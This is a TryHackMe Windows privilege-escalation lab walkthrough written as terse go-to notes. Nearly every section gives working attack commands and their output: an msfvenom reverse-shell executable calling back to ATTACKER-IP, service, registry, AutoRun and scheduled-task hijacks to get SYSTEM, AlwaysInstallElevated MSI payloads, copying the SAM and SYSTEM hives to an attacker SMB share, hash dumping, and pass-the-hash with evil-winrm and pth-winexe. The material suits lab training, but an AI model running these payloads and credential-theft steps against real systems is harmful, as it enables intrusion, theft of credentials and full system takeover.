# **Windows PrivEsc**

## Windows Privilege Escalation Practice Room on Tryhackme, Created By [Tib3rius](https://tryhackme.com/r/room/windows10privesc)

***


> Take note that this is just a straight forward go-to note after knowing what privilege escalation attack to execute on a particular target

### **Generate a Reverse Shell Executable**


To maintain persistence create a `.EXE` executable and get multiple reverse shells


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f exe -o reverse.exe

smbserver.py share -smb2support ./

# Execute below command on target system
copy \\ATTACKER-IP\share\reverse.exe C:\PrivEsc\reverse.exe

nc -nvlp 4444

# Execute below command on target system
C:\PrivEsc\reverse.exe
```



## **Service Exploits**

### **Insecure Service Permissions**



- Use `accesschk.exe` to check account permissions on a particular service 
	- Permission => `SERVICE_CHANGE_CONFIG`


```bash
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwcqv guest daclsvc

# C:\PrivEsc\accesschk.exe /accepteula -uwcqv <USERNAME> <SERVICE>

        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```


- Query the service and confirm it run with SYSTEM privileges
	- `SERVICE_START_NAME` parameter => `LocalSystem`

```powershell
C:\PrivEsc>sc qc daclsvc                                                                        
# sc qc <SERVICE>                  
[SC] QueryServiceConfig SUCCESS                

SERVICE_NAME: daclsvc                                                                          
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL                                                        
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :  
        TAG                : 0           
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :            
        SERVICE_START_NAME : LocalSystem
```


- Modify the service config and set the `BINARY_PATH_NAME` to the `reverse.exe` executable you created:


```powershell
C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
# sc config daclsvc binpath= <REVERSE_SHELL_PATH>
[SC] ChangeServiceConfig SUCCESS

# Querying the service config again binpath has been changed

C:\PrivEsc>sc qc daclsvc 
sc qc daclsvc 
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\PrivEsc\reverse.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

- Start a listener and start the service to spawn reverse shell as SYSTEM


```bash
net start daclsvc # replace 'daclsvc' with service name


################################################

❯ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.159.9 49810
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```



### **Unquoted Service Path**


- Query the service and note -:
	- `SERVICE_START_NAME` parameter runs with SYSTEM privileges.
	- `BINARY_PATH_NAME` is unquoted and contains spaces.


```powershell
C:\PrivEsc>sc qc unquotedsvc
# sc qc <SERVICE>
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```


- Using `accesschk.exe`, note that the `BUILTIN\Users` group is allowed to write to the unquoted service directory:


```powershell
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users # <= Confirmed
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```


- Copy your reverse shell executable created to the directory and rename it the first name of the next directory (`Common.exe`)



```powershell
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# copy <REVERSE_SHELL_PATH.exe> "<SERVICE_PATH.exe>"

        1 file(s) copied.
```

- Start a listener and start the service to spawn reverse shell as SYSTEM

```powershell
net start unquotedsvc # replace 'unquotedsvc' with service name

###################################################

❯ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.159.9 49878
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



### **Weak Registry Permissions**



- Query the "`regsvc`" service and note that it runs with SYSTEM privileges


```powershell
C:\PrivEsc>sc qc regsvc

# sc qc <SERVICE>

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem # <= value set to "LocalSystem"
```

- Note that the registry entry for the `regsvc` service is writable by the "`NT AUTHORITY\INTERACTIVE`" group (essentially all logged-on users):


```powershell
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc                                                                                          

# C:\PrivEsc\accesschk.exe /accepteula -uvwqk <PATH_TO_regsvc_SERVICE>                                                                                                     
HKLM\System\CurrentControlSet\Services\regsvc                                                                                                                                                 
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE # <= What we need
        KEY_ALL_ACCESS
```



- Overwrite the ImagePath registry key to point to the reverse shell binary


```powershell
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <PATH_TO_REVERSE_SHELL_BINARY.exe> /f

The operation completed successfully.
```


- Start a listener and start the service to spawn reverse shell as SYSTEM


```powershell
net start regsvc # replace 'regsvc' with service name

#######################################################

❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.159.9 49933
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



###  **Insecure Service Executables**



Query the service and note that it runs with SYSTEM privileges (`SERVICE_START_NAME`).


```powershell
C:\PrivEsc>sc qc filepermsvc

# sc qc <SERVICE_NAME>

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```


- Using `accesschk.exe`, note that the service binary (`BINARY_PATH_NAME`) file is writable by everyone:


```powershell
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# C:\PrivEsc\accesschk.exe /accepteula -quvw "<SERVICE_BINARY_PATH.exe>"


C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users # <= Confirmed
        FILE_ALL_ACCESS
```



- Copy the reverse shell executable created and replace with the service binary file:

```powershell
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

# copy <REVERSE_SHELL_PATH.exe> "<SERVICE_BINARY_PATH.exe>" /Y
        1 file(s) copied.
```



- Start a listener and start the service to spawn reverse shell as SYSTEM


```powershell
net start filepermsvc # replace 'filepermsvc' with service name

#######################################################

❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.159.9 49933
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



## **Registry** 

### **AutoRuns**



- Query the registry for AutoRun executables:

```powershell
C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```


- Using `accesschk.exe`, note that one of the AutoRun executables is writable by everyone:

```powershell
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"


AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone # <= Confirmed
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```


- Copy the reverse shell executable created and overwrite the AutoRun executable with it:


```powershell
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

        1 file(s) copied.
```


- Start up your listener
- In a real world assessment you would have to wait for an administrator to log in themselves
- Sometimes just spawning a RDP session gives us a reverse shell : ``rdesktop 10.10.240.109``
- However we are given admin creds here (`admin/password123`) so log in via a new RDP session


```powershell
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.240.109 49916
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

#######################################################

❯ xfreerdp /u:admin /p:password123 /cert:ignore /v:10.10.240.109
```


### **AlwaysInstallElevated**


- Query the registry for `AlwaysInstallElevated` keys:
	- make sure both keys are set to 1 (`0x1`).

```powershell
C:\PrivEsc>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```


- Generate a `.msi` reverse executable with `msfvenom`


```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f msi -o reverse.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```


- Transfer the `reverse.msi` file to target 
- Start a listener then run the installer to trigger a reverse shell with SYSTEM privileges:


```powershell
❯ nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.162.79 49757
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

#######################################################

msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```



## **Passwords**

### **Registry**

- The registry can be searched for keys and values that contain the word "password":


```powershell
reg query HKLM /f password /t REG_SZ /s
```


- To save time, query this specific key to find admin `AutoLogon` credentials:

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

- We can then use `winexe` binary on kali to spawn a command prompt running with the admin privileges:

```bash
❯ winexe -U 'admin%password123' //10.10.162.79 whoami
win-qba94kb3iof\admin

❯ winexe -U 'admin%password123' //10.10.162.79 cmd.exe
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>
```


> `Winexe` installs a service on the remote system, executes the command and uninstalls the service (`WinExeSvc.exe`). So you need SYSTEM level credentials for this to work.



### **Saved Creds**


- List any saved credentials:

```powershell
C:\PrivEsc>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence
    
    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```



- Start a listener and run the reverse shell binary using `runas` with the user's saved credentials:


```powershell
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.162.79 49825
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin


#######################################################

C:\PrivEsc>runas /savecred /user:admin C:\PrivEsc\reverse.exe
```



### **Security Account Manager (SAM)**



- SAM and SYSTEM files can be used to extract user password hashes

- Transfer the SAM and SYSTEM files (make sure to start up smbserver)

```bash
# Run this on kali
smbserver.py share -smb2support ./

# Run this on the windows server
copy C:\Windows\Repair\SAM \\ATTACKER-IP\share\  
copy C:\Windows\Repair\SYSTEM \\ATTACKER-IP\share\
```


> Was having problem transferring the `SYSTEM` file so i decided to transfer `secretsdump.exe` to the windows server, If it was possible to transfer the `SYSTEM` file, could have dumped it with `secretsdump.py`.


```powershell
PS C:\PrivEsc> wget 10.8.23.29/secretsdump.exe -O secretsdump.exe

PS C:\PrivEsc> .\secretsdump.exe -sam C:\Windows\Repair\SAM -system C:\Windows\Repair\SYSTEM LOCAL

Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Target system bootKey: 0xf4fb8f729017b7d8a540e99f6dabea79
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
[*] Cleaning up...
```

![](https://i.imgur.com/ObRZ6uP.png)


- Then `PtH` for the admin user if you like, you can also crack the password if you like


```powershell
❯ evil-winrm -i 10.10.162.79 -u admin -H a9fdfa038c4b75ebc76dc855dd74f0da
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\admin\Documents> whoami
win-qba94kb3iof\admin
```

- You can also `PtH` with the `winexe` binary on linux using the full NTLM hash.


```powershell
❯ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.151.253 cmd.exe

E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin
```


## **Scheduled Tasks**


- Look for scripts/contents that might have tasks running

```powershell
C:\PrivEsc>type C:\DevTools\CleanUp.ps1
type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
```


- The above script runs as SYSTEM every minute. 
- Using `accesschk.exe`, note that you have the ability to write to the file:


```powershell
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA # <= Confirmed
        FILE_WRITE_EA # <= Confirmed
        DELETE
        SYNCHRONIZE
        READ_CONTROL
```



- Start up your listener and append a line to the `C:\DevTools\CleanUp.ps1` which runs the reverse shell executable:
- Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.


```powershell
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

#######################################################

❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.151.253 49834
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



## **Insecure GUI Apps**


- We need GUI session for this so make sure to connect via RDP

- There is a "`AdminPaint`" shortcut on Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:


```powershell
C:\PrivEsc>tasklist /V | findstr mspaint.exe
tasklist /V | findstr mspaint.exe
mspaint.exe                   3184 RDP-Tcp#0                  2     30,008 K Running         WIN-QBA94KB3IOF\admin                                   0:00:00 Untitled - Paint
```


- In Paint, click "**File**" > "**Open**". In the open file dialog box, click in the navigation input and paste: `file://c:/windows/system32/cmd.exe`

- Then Press [Enter] to spawn a command prompt running with admin privileges.

![](https://i.imgur.com/6qUTliq.png)



## **Startup Apps**


- Using `accesschk.ex`e, Check if `BUILTIN\Users` group can write files to the `StartUp` directory:

```powershell
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"



AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users # <= Confirmed
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```


- Save the following into a file named `CreateShortcut.vbs` in the windows server.
- Make sure to replace `oLink.TargetPath` with the `.EXE` reverse shell binary path


```vbs
type C:\PrivEsc\CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```


- Then create a shortcut to this file using `cscript`.


```powershell
C:\PrivEsc>cscript C:\PrivEsc\CreateShortcut.vbs

cscript C:\PrivEsc\CreateShortcut.vbs

Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.
```

- Start a listener, and then simulate an admin logon using RDP and the credentials you previously extracted:

```powershell
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.151.253 49968
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

#######################################################

❯ rdesktop -u admin 10.10.151.253
```


## **Token Impersonation**

- This could be done using `GodPotato` or `Printspoofer`
- Choose your poison but `Printspoofer` is preferred



## **Privilege Escalation Scripts**


- Several tools have been written which help find potential privilege escalations on Windows -:
	- `winPEASany.exe`
	- `Seatbelt.exe`
	- `PowerUp.ps1`
	- `SharpUp.exe`



